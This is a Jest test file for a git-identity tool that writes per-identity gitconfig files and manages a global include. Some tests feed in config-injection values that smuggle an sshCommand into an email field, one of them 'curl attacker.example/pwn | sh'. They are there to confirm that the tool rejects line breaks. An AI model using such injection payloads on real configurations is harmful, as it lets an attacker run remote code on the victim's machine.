import { execFile } from 'child_process';
import os from 'os';
import fs from 'fs-extra';
import path from 'path';

jest.mock('child_process');

import { writeActiveGitconfig, writeIdentityGitconfig, ensureGlobalInclude, activeGitconfigPath, identityGitconfigPath, getGitUser } from '../../src/infra/git';

const mockExecFile = execFile as unknown as jest.MockedFunction<typeof execFile>;

function execFileError(code: number): NodeJS.ErrnoException {
  const error = new Error(`exit ${code}`) as NodeJS.ErrnoException;
  (error as unknown as { code: number }).code = code;
  return error;
}

describe('infra/git — includeIf-first global identity', () => {
  let tempHome: string;

  beforeAll(async () => {
    tempHome = await fs.mkdtemp(path.join(os.tmpdir(), 'dss-git-test-'));
  });

  afterAll(async () => {
    await fs.remove(tempHome);
  });

  beforeEach(() => {
    jest.spyOn(os, 'homedir').mockReturnValue(tempHome);
    mockExecFile.mockReset();
  });

  afterEach(async () => {
    jest.restoreAllMocks();
    await fs.remove(path.join(tempHome, '.dss'));
  });

  describe('writeActiveGitconfig (real temp-dir file assertions)', () => {
    it('writes a [user] + [core] sshCommand section for a keyed identity', async () => {
      await writeActiveGitconfig({
        name: 'work',
        userName: 'Jane Doe',
        email: 'jane@example.com',
        sshKeyPath: '/keys/work/id_ed25519'
      });

      const content = await fs.readFile(activeGitconfigPath(), 'utf8');
      expect(content).toBe(
        '[user]\n' +
        '\tname = "Jane Doe"\n' +
        '\temail = "jane@example.com"\n' +
        '[core]\n' +
        '\tsshCommand = "ssh -i \'/keys/work/id_ed25519\' -o IdentitiesOnly=yes"\n'
      );
    });

    it('writes a [user]-only section for a keyless identity (no [core] block)', async () => {
      await writeActiveGitconfig({
        name: 'personal',
        userName: 'Jane Doe',
        email: 'jane@personal.example.com',
        sshKeyPath: ''
      });

      const content = await fs.readFile(activeGitconfigPath(), 'utf8');
      expect(content).toBe(
        '[user]\n' +
        '\tname = "Jane Doe"\n' +
        '\temail = "jane@personal.example.com"\n'
      );
      expect(content).not.toContain('[core]');
    });

    it('overwrites a previous active.gitconfig atomically, leaving no stale content', async () => {
      await writeActiveGitconfig({
        name: 'a', userName: 'A User', email: 'a@example.com', sshKeyPath: '/keys/a/id_ed25519'
      });
      await writeActiveGitconfig({
        name: 'b', userName: 'B User', email: 'b@example.com', sshKeyPath: ''
      });

      const content = await fs.readFile(activeGitconfigPath(), 'utf8');
      expect(content).toContain('B User');
      expect(content).not.toContain('A User');
      expect(content).not.toContain('[core]');

      // No leftover temp files from the atomic write.
      const files = await fs.readdir(path.dirname(activeGitconfigPath()));
      expect(files.filter((f) => f.endsWith('.tmp'))).toHaveLength(0);
    });

    it('throws and writes nothing when userName contains a newline (hard gate against corrupting/injecting into the globally-included file)', async () => {
      await expect(writeActiveGitconfig({
        name: 'evil',
        userName: 'Evil User',
        email: 'evil@example.com\n[core]\n\tsshCommand = curl attacker.example/pwn | sh #',
        sshKeyPath: ''
      })).rejects.toThrow(/line break/);

      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
    });

    it('throws on a crafted "[core]\\n" config-injection value in email, refusing to write anything', async () => {
      const injection = 'victim@example.com\n[core]\n\tsshCommand = ssh -i /tmp/attacker-key -o ProxyCommand=evil';

      await expect(writeActiveGitconfig({
        name: 'injected',
        userName: 'Victim',
        email: injection,
        sshKeyPath: '/keys/victim/id_ed25519'
      })).rejects.toThrow(/line break/);

      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
    });

    it('throws on a carriage return in sshKeyPath', async () => {
      await expect(writeActiveGitconfig({
        name: 'cr',
        userName: 'CR User',
        email: 'cr@example.com',
        sshKeyPath: '/keys/cr\r/id_ed25519'
      })).rejects.toThrow(/line break/);

      await expect(fs.pathExists(activeGitconfigPath())).resolves.toBe(false);
    });
  });

  describe('writeIdentityGitconfig (real temp-dir file assertions — shares renderIdentityGitconfig with writeActiveGitconfig)', () => {
    it('writes ~/.dss/identities/<slug>.gitconfig with the exact same [user] + [core] shape as active.gitconfig', async () => {
      await writeIdentityGitconfig({
        name: 'Work Client',
        userName: 'Jane Doe',
        email: 'jane@example.com',
        host: 'github.com',
        key: { path: '/keys/work/id_ed25519', algorithm: 'ed25519' }
      });

      const configPath = identityGitconfigPath('Work Client');
      expect(configPath).toBe(path.join(tempHome, '.dss', 'identities', 'work-client.gitconfig'));

      const content = await fs.readFile(configPath, 'utf8');
      expect(content).toBe(
        '[user]\n' +
        '\tname = "Jane Doe"\n' +
        '\temail = "jane@example.com"\n' +
        '[core]\n' +
        '\tsshCommand = "ssh -i \'/keys/work/id_ed25519\' -o IdentitiesOnly=yes"\n'
      );
    });

    it('writes a [user]-only section for a keyless identity', async () => {
      await writeIdentityGitconfig({
        name: 'personal',
        userName: 'Jane Doe',
        email: 'jane@personal.example.com',
        host: 'github.com'
      });

      const content = await fs.readFile(identityGitconfigPath('personal'), 'utf8');
      expect(content).not.toContain('[core]');
    });

    it('throws and writes nothing when email contains a newline (same hard gate as active.gitconfig)', async () => {
      await expect(writeIdentityGitconfig({
        name: 'evil',
        userName: 'Evil User',
        email: 'evil@example.com\n[core]\n\tsshCommand = curl attacker.example/pwn | sh #',
        host: 'github.com'
      })).rejects.toThrow(/line break/);

      await expect(fs.pathExists(identityGitconfigPath('evil'))).resolves.toBe(false);
    });
  });

  describe('ensureGlobalInclude idempotence (mocked execFile)', () => {
    it('adds the include when unset (git exits 1 for --get-all)', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(execFileError(1));
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await ensureGlobalInclude(activeGitconfigPath());

      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
      expect(addCalls).toHaveLength(1);
      expect(addCalls[0][1]).toEqual(['config', '--global', '--add', 'include.path', activeGitconfigPath()]);
    });

    it('does not add the include when it is already present (idempotent)', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(null, { stdout: `${activeGitconfigPath()}\n`, stderr: '' });
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await ensureGlobalInclude(activeGitconfigPath());

      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
      expect(addCalls).toHaveLength(0);
    });

    it('adds exactly once alongside unrelated pre-existing includes (never a duplicate entry)', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(null, { stdout: '/other/include.gitconfig\n', stderr: '' });
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await ensureGlobalInclude(activeGitconfigPath());

      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
      expect(addCalls).toHaveLength(1);
    });

    it('propagates a non-exit-1 error from --get-all rather than treating it as "unset"', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(execFileError(128));
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await expect(ensureGlobalInclude(activeGitconfigPath())).rejects.toThrow('exit 128');
    });

    it('is generalized over the config path — works identically for a second (e.g. rules.gitconfig) path', async () => {
      const rulesPath = path.join(tempHome, '.dss', 'rules.gitconfig');
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(execFileError(1));
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await ensureGlobalInclude(rulesPath);

      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
      expect(addCalls).toHaveLength(1);
      expect(addCalls[0][1]).toEqual(['config', '--global', '--add', 'include.path', rulesPath]);
    });

    it('appends rules.gitconfig AFTER an already-present active.gitconfig include (correct precedence order for free)', async () => {
      // Simulates the normal call order: dss use/new already added
      // active.gitconfig's include; dss rule add now adds rules.gitconfig's
      // — --add always appends, so the resulting include.path list keeps
      // active.gitconfig first and rules.gitconfig second.
      const rulesPath = path.join(tempHome, '.dss', 'rules.gitconfig');
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('--get-all')) {
          callback(null, { stdout: `${activeGitconfigPath()}\n`, stderr: '' });
        } else {
          callback(null, { stdout: '', stderr: '' });
        }
        return {} as any;
      }) as any);

      await ensureGlobalInclude(rulesPath);

      const addCalls = mockExecFile.mock.calls.filter((call) => (call[1] as string[]).includes('--add'));
      expect(addCalls).toHaveLength(1);
      expect(addCalls[0][1]).toEqual(['config', '--global', '--add', 'include.path', rulesPath]);
    });
  });

  // Fix round (review Important #1): getGitUser must pass `--includes` on
  // BOTH `git config --global` calls — without it, git's documented
  // default SKIPS `include.path`/`includeIf` expansion whenever a scope
  // flag (--global/--local/--system) is given, so a bare `git config
  // --global user.name` reports unset in this codebase's own
  // includeIf-first setup (DSS never writes user.name/user.email directly
  // into ~/.gitconfig, only into active.gitconfig/identity gitconfigs,
  // both reached via include.path). This previously made both the
  // pre-existing "Git identity drift" doctor check and the new "Rule
  // drift" check dead code — see tests/commands/doctorCli.test.ts and
  // tests/commands/ruleCli.test.ts for the real, unmocked end-to-end proof
  // that the checks actually resolve now.
  describe('getGitUser (mocked execFile — exact arg arrays)', () => {
    it('calls `git config --global --includes user.name` and `...user.email` (in that order)', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const cmdArgs = args[1] as string[];
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        if (cmdArgs.includes('user.name')) {
          callback(null, { stdout: 'Work User\n', stderr: '' });
        } else {
          callback(null, { stdout: 'work@example.com\n', stderr: '' });
        }
        return {} as any;
      }) as any);

      const result = await getGitUser();

      expect(result).toEqual({ userName: 'Work User', email: 'work@example.com' });
      expect(mockExecFile.mock.calls[0][1]).toEqual(['config', '--global', '--includes', 'user.name']);
      expect(mockExecFile.mock.calls[1][1]).toEqual(['config', '--global', '--includes', 'user.email']);
    });

    it('propagates a non-zero exit (e.g. genuinely unset) as a rejection', async () => {
      mockExecFile.mockImplementation(((...args: unknown[]) => {
        const callback = args[args.length - 1] as (...cbArgs: unknown[]) => void;
        callback(execFileError(1));
        return {} as any;
      }) as any);

      await expect(getGitUser()).rejects.toThrow('exit 1');
    });
  });
});
